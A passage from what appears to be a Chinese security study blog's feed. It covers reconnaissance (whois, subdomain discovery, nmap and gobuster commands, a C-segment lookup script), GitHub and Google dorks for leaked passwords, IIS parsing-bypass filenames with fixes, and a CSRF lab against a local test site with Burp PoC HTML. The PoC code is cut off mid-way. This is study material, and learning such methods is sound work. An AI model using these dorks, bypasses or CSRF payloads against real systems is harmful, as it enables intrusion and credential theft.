title="4.在线whois查询"></a>4.在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><p>–站长之家域名WHOIS信息查询地址 <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址 <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址 <a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>–美橙互联域名WHOIS信息查询地址 <a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p>爱名网域名WHOIS信息查询地址 <a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>易名网域名WHOIS信息查询地址 <a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>中国万网域名WHOIS信息查询地址 <a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><p>西部数码域名WHOIS信息查询地址 <a href="https://whois.west.cn/">https://whois.west.cn/</a></p><p>新网域名WHOIS信息查询地址 <a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p><p>纳网域名WHOIS信息查询地址 <a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p><p>中资源域名WHOIS信息查询地址 <a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p><p>三五互联域名WHOIS信息查询地址 <a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p><p>新网互联域名WHOIS信息查询地址 <a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p><p>国外WHOIS信息查询地址 <a href="https://who.is/">https://who.is/</a></p><p>-kali自带的whois查询：whois 域名</p><h2 id="5-在线网站备案查询"><a href="#5-在线网站备案查询" class="headerlink" title="5. 在线网站备案查询"></a>5. 在线网站备案查询</h2><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><ol><li>天眼查 <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>ICP备案查询网<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></li><li>爱站备案查询<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></li><li>域名助手备案信息查询 <a href="http://cha.fute.com/index">http://cha.fute.com/index</a></li></ol><h2 id="6-收集子域名"><a href="#6-收集子域名" class="headerlink" title="6.收集子域名"></a>6.收集子域名</h2><ol><li>作用</li></ol><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><ol start="2"><li>常用方法</li></ol><p>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。</p><p>首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。</p><p>查找目标域名信息的方法有：</p><ol><li>FOFA title=”公司名称”</li><li>百度 intitle=公司名称</li><li>Google intitle=公司名称 </li><li>站长之家，直接搜索名称或者网站域名即可查看相关信息：</li></ol><p><a href="http://tool.chinaz.com/">http://tool.chinaz.com/</a></p><ol start="5"><li>钟馗之眼 site=域名即可</li></ol><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><ol start="3"><li>子域名在线查询</li></ol><p><a href="https://chaziyu.com/">https://chaziyu.com/</a></p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><ol start="4"><li>dns侦测</li></ol><p> <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><ol start="5"><li>子域名扫描工具</li></ol><p>IP138查询子域名、FOFA搜索子域名、Hackertarget查询子域名、<strong>Layer子域名挖掘机</strong>、SubDomainBrute、Sublist3r、OneForALL、<strong>FuzzDomain</strong></p><h2 id="7-端口扫描"><a href="#7-端口扫描" class="headerlink" title="7.端口扫描"></a>7.端口扫描</h2><h3 id="1-masscan端口扫描"><a href="#1-masscan端口扫描" class="headerlink" title="1.masscan端口扫描"></a>1.masscan端口扫描</h3><p>masscan -p 1-65535 ip –rate=1000</p><h3 id="2-御剑端口扫描工具"><a href="#2-御剑端口扫描工具" class="headerlink" title="2. 御剑端口扫描工具"></a>2. 御剑端口扫描工具</h3><h3 id="3-Nmap端口扫描"><a href="#3-Nmap端口扫描" class="headerlink" title="3.Nmap端口扫描"></a>3.Nmap端口扫描</h3><p>常用参数，如：</p><p>nmap -sV 192.168.0.2对端口上的服务程序版本进行扫描 </p><p>nmap -sT 192.168.0.2TCP连接扫描</p><p>nmap -sS 192.168.96.4  SYN扫描，使用最频繁，安全，快</p><p>nmap -Pn -A -sC 192.168.0.2目标机禁用ping，绕过ping扫描</p><p>nmap -sU -sT -p0-65535 192.168.122.1  </p><table><thead><tr><th align="center">参数</th><th align="center">功能</th><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sU</td><td align="center">扫描UDP端口</td><td align="center">-sT</td><td align="center">TCP连接扫描，不安全，慢</td></tr><tr><td align="center">-sS</td><td align="center">SYN扫描，使用最频繁，安全，快</td><td align="center">-Pn</td><td align="center">目标机禁用ping，绕过ping扫描</td></tr><tr><td align="center">-A</td><td align="center">强力扫描，耗时长</td><td align="center">-sC</td><td align="center">使用脚本进行扫描，耗时长</td></tr><tr><td align="center">-sP</td><td align="center">仅仅对目标进行ping检测</td><td align="center">-v</td><td align="center">显示冗余信息(扫描细节)</td></tr><tr><td align="center">-O</td><td align="center">对目标主机的操作系统进行扫描</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><p>nmap -iL ip.txt</p><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><h3 id="端口表"><a href="#端口表" class="headerlink" title="端口表"></a>端口表</h3><p><img src="https://pic.imgdb.cn/item/66e42774d9c307b7e9e838fd.png"></p><h2 id="8-查找真实IP"><a href="#8-查找真实IP" class="headerlink" title="8.查找真实IP"></a>8.查找真实IP</h2><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip，根据这个ip继续查询旁站。</p><p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p><h2 id="9-旁站和C段"><a href="#9-旁站和C段" class="headerlink" title="9.旁站和C段"></a>9.旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><h3 id="1-在线c段-webscan-cc"><a href="#1-在线c段-webscan-cc" class="headerlink" title="1. 在线c段 webscan.cc"></a>1. 在线c段 webscan.cc</h3><p><a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><h3 id="2-站长之家"><a href="#2-站长之家" class="headerlink" title="2.站长之家"></a>2.站长之家</h3><p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><h3 id="3-网络空间搜索引擎"><a href="#3-网络空间搜索引擎" class="headerlink" title="3. 网络空间搜索引擎"></a>3. 网络空间搜索引擎</h3><h3 id="4-Nmap-Msscan扫描"><a href="#4-Nmap-Msscan扫描" class="headerlink" title="4.Nmap,Msscan扫描"></a>4.Nmap,Msscan扫描</h3><p>nmap -p 80,443,8000,8080 -Pn 192.168.0.0/24</p><p>C段利用脚本</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">c段利用脚本</span><br><span class="line">pip install requests</span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_c</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"正在收集{}"</span>.<span class="built_in">format</span>(ip))</span><br><span class="line">    url=<span class="string">"http://api.webscan.cc/?action=query&amp;ip={}"</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">    req=requests.get(url=url)</span><br><span class="line">    html=req.text</span><br><span class="line">    data=req.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'null'</span> <span class="keyword">not</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"resulit.txt"</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(ip + <span class="string">'\n'</span>)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"resulit.txt"</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">"\t{} {}\n"</span>.<span class="built_in">format</span>(i[<span class="string">'domain'</span>],i[<span class="string">'title'</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"     [+] {} {}[+]"</span>.<span class="built_in">format</span>(i[<span class="string">'domain'</span>],i[<span class="string">'title'</span>]))</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ips</span>(<span class="params">ip</span>):</span><br><span class="line">    iplist=[]</span><br><span class="line">    ips_str = ip[:ip.rfind(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> ips <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        ipadd=ips_str + <span class="string">'.'</span> + <span class="built_in">str</span>(ips)</span><br><span class="line">        iplist.append(ipadd)</span><br><span class="line">    <span class="keyword">return</span> iplist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip=<span class="built_in">input</span>(<span class="string">"请你输入要查询的ip:"</span>)</span><br><span class="line"></span><br><span class="line">ips=get_ips(ip)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ips:</span><br><span class="line">    get_c(p)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="10-网络空间搜索引擎"><a href="#10-网络空间搜索引擎" class="headerlink" title="10.网络空间搜索引擎"></a>10.网络空间搜索引擎</h2><p>1、同IP旁站：ip=”192.168.0.1”</p><p>2、C段：ip=”192.168.0.0/24”</p><p>3、子域名：domain=”baidu.com”</p><p>4、标题/关键字：title=”百度”</p><p>5、如果需要将结果缩小到某个城市的范围，那么可以拼接语句</p><p> title=”百度”&amp;&amp; region=”Beijing”</p><p>6、特征：body=”百度”或header=”baidu”</p><h2 id="11-扫描敏感目录-文件"><a href="#11-扫描敏感目录-文件" class="headerlink" title="11.扫描敏感目录/文件"></a>11.扫描敏感目录/文件</h2><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台，敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一半交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><h3 id="1-御剑"><a href="#1-御剑" class="headerlink" title="1. 御剑"></a>1. 御剑</h3><h3 id="2-7kbscan"><a href="#2-7kbscan" class="headerlink" title="2.7kbscan"></a>2.7kbscan</h3><h3 id="3-bbscan"><a href="#3-bbscan" class="headerlink" title="3.bbscan"></a>3.bbscan</h3><h3 id="4-dirsearch"><a href="#4-dirsearch" class="headerlink" title="4.dirsearch"></a>4.dirsearch</h3><h3 id="5-gobuster"><a href="#5-gobuster" class="headerlink" title="5.gobuster"></a>5.gobuster</h3><p>gobuster dir -u <a href="https://www.servyou.com.cn/">https://www.servyou.com.cn/</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50</p><p>dir -u 网址 w字典 -x 指定后缀 -t 线程数量</p><h2 id="12-网站文件"><a href="#12-网站文件" class="headerlink" title="12.网站文件"></a>12.网站文件</h2><ol><li>robots.txt</li><li>crossdomin.xml</li><li>sitemap.xml      xml网站地图协议</li><li>后台目录</li><li>网站安装包</li><li>网站上传目录</li><li>mysql管理页面</li><li>phpinfo</li><li>网站文本编辑器</li><li>测试文件</li><li>网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</li><li>DS_Store 文件</li><li>vim编辑器备份文件(.swp)</li><li>WEB—INF/web.xml文件</li></ol><p>15 .git</p><p>16 .svn</p><h2 id="13-CMS识别"><a href="#13-CMS识别" class="headerlink" title="13.CMS识别"></a>13.CMS识别</h2><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划，可以用公开的poc或自己累积的对应手法等进行正式的渗透测试。</p><h3 id="13-1-云悉"><a href="#13-1-云悉" class="headerlink" title="13.1 云悉"></a>13.1 云悉</h3><p><a href="http://www.yunsee.cn/">http://www.yunsee.cn</a></p><h3 id="13-2-潮汐指纹"><a href="#13-2-潮汐指纹" class="headerlink" title="13.2 潮汐指纹"></a>13.2 潮汐指纹</h3><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><h3 id="13-3-CMS指纹识别"><a href="#13-3-CMS指纹识别" class="headerlink" title="13.3 CMS指纹识别"></a>13.3 CMS指纹识别</h3><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h3 id="13-4-kali的whatweb"><a href="#13-4-kali的whatweb" class="headerlink" title="13.4 kali的whatweb"></a>13.4 kali的whatweb</h3><h2 id="14-敏感文件搜索"><a href="#14-敏感文件搜索" class="headerlink" title="14.敏感文件搜索"></a>14.敏感文件搜索</h2><h3 id="1-GitHub搜索"><a href="#1-GitHub搜索" class="headerlink" title="1.  GitHub搜索"></a>1.  GitHub搜索</h3><p>in:name test #仓库标题搜索含有关键字test</p><p>in:descripton test #仓库描述搜索含有关键字</p><p>in:readme test #Readme文件搜素含有关键字</p><p>搜索某些系统的密码</p><p><a href="https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控</p><p><a href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p><p>谷歌搜索</p><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID=’sa’;Password</p><p>site:Github.com inurl:sql</p><p>SVN 信息收集</p><p>site:Github.com svn</p><p>site:Github.com svn username</p><p>site:Github.com svn password</p><p>site:Github.com svn username password</p><p>综合信息收集</p><p>site:Github.com password</p><p>site:Github.com ftp ftppassword</p><p>site:Github.com 密码</p><p>site:Github.com 内部</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p><p><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a></p><p><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a></p><p><a href="https://github.com/search?q=smtp+bilibili.com&amp;type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="2-Google-hacking"><a href="#2-Google-hacking" class="headerlink" title="2.  Google-hacking"></a>2.  Google-hacking</h3><p>site:域名</p><p>inurl: url中存在的关键字网页</p><p>intext：网页正文中的关键词</p><p>filetype:指定文件类型</p><h3 id="3-wooyun漏洞库"><a href="#3-wooyun漏洞库" class="headerlink" title="3.  wooyun漏洞库"></a>3.  wooyun漏洞库</h3><p><a href="https://wooyun.website/">https://wooyun.website/</a></p><h3 id="4-网盘搜索"><a href="#4-网盘搜索" class="headerlink" title="4.  网盘搜索"></a>4.  网盘搜索</h3><p>凌云搜索 <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net/</a></p><p>盘搜搜：<a href="http://www.pansoso.com/">http://www.pansoso.com/</a></p><p>盘搜：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p><h3 id="5-社工库"><a href="#5-社工库" class="headerlink" title="5.  社工库"></a>5.  社工库</h3><p>名字/常用id/邮箱/密码/电话 登录 网盘 网站 邮箱 找敏感信息</p><p>tg机器人</p><h2 id="15-网站头信息收集"><a href="#15-网站头信息收集" class="headerlink" title="15.网站头信息收集"></a>15.网站头信息收集</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NB-IoT技术</title>
      <link href="/2024/09/11/nb-iot-ji-zhu/"/>
      <url>/2024/09/11/nb-iot-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="NB-IoT技术"><a href="#NB-IoT技术" class="headerlink" title="NB-IoT技术"></a>NB-IoT技术</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web中间件解析漏洞</title>
      <link href="/2024/09/06/web-zhong-jian-jian-jie-xi-lou-dong/"/>
      <url>/2024/09/06/web-zhong-jian-jian-jie-xi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Web中间件解析漏洞"><a href="#Web中间件解析漏洞" class="headerlink" title="Web中间件解析漏洞"></a>Web中间件解析漏洞</h1><p>中间件：apache、nginx、tomcat、weblogic、jboss等</p><h2 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h2><blockquote><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。win7-win10中多为iis7.x-8.x了，版本比较高。</p></blockquote><p>目录解析(6.0)<br>        形式:<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>        原理:服务器默认会把.asp，.asa目录下的文件都解析成asp文件<br>文件解析<br>        形式:<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>        原理:服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。<br>解析文件类型<br>        IIS6.0 默认的可执行文件除了asp还包含这三种:<br>        /test.asa<br>        /test.cer<br>        /test.cdx<br>修复方案</p><ol><li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。</li><li>做好权限设置，限制用户创建文件夹。</li><li>安装防护软件，比如D盾等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web中间件解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cookie和session</title>
      <link href="/2024/09/04/cookie-he-session/"/>
      <url>/2024/09/04/cookie-he-session/</url>
      
        <content type="html"><![CDATA[<h1 id="cookie和session"><a href="#cookie和session" class="headerlink" title="cookie和session"></a>cookie和session</h1><p>Cookie和Session是Web开发中用于存储用户信息的两种机制，它们之间有几个关键的区别：</p><ol><li><strong>存储位置</strong>：<ul><li><strong>Cookie</strong>：数据存储在用户的浏览器中。每次请求时，浏览器会自动将相关的Cookie发送到服务器。</li><li><strong>Session</strong>：数据存储在服务器端。客户端只会存储一个Session ID，服务器通过这个ID来识别和访问对应的Session数据。</li></ul></li><li><strong>存储容量</strong>：<ul><li><strong>Cookie</strong>：通常每个Cookie的大小限制在4KB左右，且浏览器对每个域名的Cookie数量也有限制（通常为20个左右）。</li><li><strong>Session</strong>：存储在服务器上，容量通常较大，受限于服务器的存储能力。</li></ul></li><li><strong>安全性</strong>：<ul><li><strong>Cookie</strong>：由于存储在客户端，容易受到XSS（跨站脚本攻击）等攻击，因此需要采取措施（如设置HttpOnly和Secure标志）来提高安全性。</li><li><strong>Session</strong>：数据存储在服务器上，相对更安全，因为用户无法直接访问Session数据。</li></ul></li><li><strong>有效期</strong>：<ul><li><strong>Cookie</strong>：可以设置过期时间，过期后自动删除。Cookie可以是持久性的（存储在硬盘上）或会话性的（浏览器关闭后删除）。</li><li><strong>Session</strong>：通常在用户关闭浏览器或Session超时后失效。Session的有效期可以在服务器端配置。</li></ul></li><li><strong>使用场景</strong>：<ul><li><strong>Cookie</strong>：适合存储一些小型的、非敏感的数据，如用户偏好设置、主题选择等。</li><li><strong>Session</strong>：适合存储用户的登录状态、购物车信息等需要保密或较大数据量的信息。</li></ul></li><li><strong>性能</strong>：<ul><li><strong>Cookie</strong>：每次请求都会发送到服务器，可能会增加网络负担。</li><li><strong>Session</strong>：只需发送Session ID，减少了数据传输量，通常性能更优。</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> cookie和session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="/2024/09/04/csrf-lou-dong/"/>
      <url>/2024/09/04/csrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）</p><p>主要涉及到攻击者利用受害者尚未失效的身份认证信息（如cookie、会话令牌等），通过诱导用户点击恶意链接或访问包含攻击代码的页面，从而在用户不知情的情况下以受害者的身份向服务器发送请求，完成非法操作（如转账、修改密码等）</p><img src="https://pic.imgdb.cn/item/66d825ced9c307b7e9f114f8.png" style="zoom:67%;"><h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><h3 id="站外和站内"><a href="#站外和站内" class="headerlink" title="站外和站内"></a>站外和站内</h3><ol><li>站内</li></ol><p>CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的。在一些敏感的操作中(如修改密码、添加用户等)，本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，通过get请求来攻击，受害者浏览了这样的页面就会被强迫发起这些请求。</p><ol start="2"><li>站外</li></ol><p>CSRF站外类型的漏洞本质上就是传统意义上的外部提交教据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题(这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复)，但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1.最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>2.对目标站点增删改查的地方进行标记，并观察逻辑，判断请求是否可以伪造。</p><p>比如修改管理员账号时，不需要验证旧密码</p><p>比如修改敏感信息不需要token验证（确认凭证的有效期）</p><p>虽然退出或关闭了览器，但Cookie仍然有效，或者Session没有及时过期，导致CSRF攻击变得简单</p><h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul><li><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。</p></li><li><p>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p></li></ul><h2 id="攻击场景例子"><a href="#攻击场景例子" class="headerlink" title="攻击场景例子"></a>攻击场景例子</h2><p><img src="https://pic.imgdb.cn/item/66d82678d9c307b7e9f2adcf.png"></p><p>lucy想要在购物网站上修改购物地址，这个操作是lucy通过浏览器向后端发送了请求。这个请求里面包含了lucy的新的收货地址，如果是通过GET提交的，那么会以URL传参的方式的方式将新的地址提交给后台，类似上图中的URL，相当于点了链接就能修改个人信息。</p><p>如果这时候攻击者想要修改lucy的信息怎么办？那么他需要取得lucy的账号，获得登录权限。这时候他可以将修改个人信息的请求伪造一下，构造类似下图中的URL，引诱lucy在登录状态下进行点击，这样攻击就成功了。</p><p><img src="https://pic.imgdb.cn/item/66d82694d9c307b7e9f2dd3b.png"></p><h2 id="攻击实验"><a href="#攻击实验" class="headerlink" title="攻击实验"></a>攻击实验</h2><h3 id="自解压文件完成CSRF攻击删除网站数据（GET请求）"><a href="#自解压文件完成CSRF攻击删除网站数据（GET请求）" class="headerlink" title="自解压文件完成CSRF攻击删除网站数据（GET请求）"></a>自解压文件完成CSRF攻击删除网站数据（GET请求）</h3><p><img src="https://pic.imgdb.cn/item/66d83e07d9c307b7e9194078.png"></p><p>管理员正常登陆界面</p><p>要获取管理员删除数据的url，用bp抓包</p><p><img src="https://pic.imgdb.cn/item/66d83ee1d9c307b7e91ad003.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.34/pikachu-master/pikachu-master/vul/overpermission/op2/op2_admin.php?id=25</span><br></pre></td></tr></tbody></table></figure><p>这个动作也就是删除数据包的get请求的数据包，所以只要获得了管理员的cookie，访问这个url就可以删除对应id的数据</p><p>那么现在就做一个自解压的压缩包，并且设置解压后访问此攻击url，如果管理员正在访问此界面，并且解压了这个攻击压缩包，那么就攻击成功，此id的用户被删除</p><p>制作自解压压缩包：</p><img src="https://pic.imgdb.cn/item/66d840aed9c307b7e91d79c9.png" style="zoom:50%;"><img src="https://pic.imgdb.cn/item/66d840ded9c307b7e91dbe9d.png" style="zoom:50%;"><p><img src="https://pic.imgdb.cn/item/66d840f6d9c307b7e91de5f3.png"></p><p>未攻击之前页面数据：</p><p><img src="https://pic.imgdb.cn/item/66d84117d9c307b7e91e21b8.png"></p><p>解压压缩包，攻击之后id=16的数据（最后一条）被删除</p><p><img src="https://pic.imgdb.cn/item/66d841a2d9c307b7e91f67b4.png"></p><h3 id="基于POST请求的账号创建"><a href="#基于POST请求的账号创建" class="headerlink" title="基于POST请求的账号创建"></a>基于POST请求的账号创建</h3><p>用户准备更改信息</p><p><img src="https://pic.imgdb.cn/item/66d877ded9c307b7e96d7626.png"></p><p>bp抓包，是一个POST包</p><p><img src="https://pic.imgdb.cn/item/66d8783bd9c307b7e96dcc33.png"></p><p>用bp自带的工具，生成CSRF POC </p><p><img src="https://pic.imgdb.cn/item/66d87885d9c307b7e96e151f.png"></p><p>并将生成的html代码，放到文件中，生成一个html文件</p><p><img src="https://pic.imgdb.cn/item/66d878c6d9c307b7e96e532b.png"></p><p>让受害者点开html中的按钮</p><p><img src="https://pic.imgdb.cn/item/66d8796cd9c307b7e96ef20b.png"></p><p>未更改信息之前：</p><p><img src="https://pic.imgdb.cn/item/66d879edd9c307b7e96f653f.png"></p><p>受害者在登陆的情况下，同时用与登录相同的浏览器打开攻击html之后，点击按钮，信息被更改</p><p><img src="https://pic.imgdb.cn/item/66d87a98d9c307b7e97002e5.png"></p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><p><img src="https://pic.imgdb.cn/item/66d87eb7d9c307b7e973ed0e.png"></p><p>在修改密码页面，bp抓包，然后放到重发器中，丢弃包</p><p><img src="https://pic.imgdb.cn/item/66d87fb4d9c307b7e974e6f8.png"></p><p>按理来说，这里应该不用输入原密码，这样才是一个没有防护的状态</p><p>生成一个html页面</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span 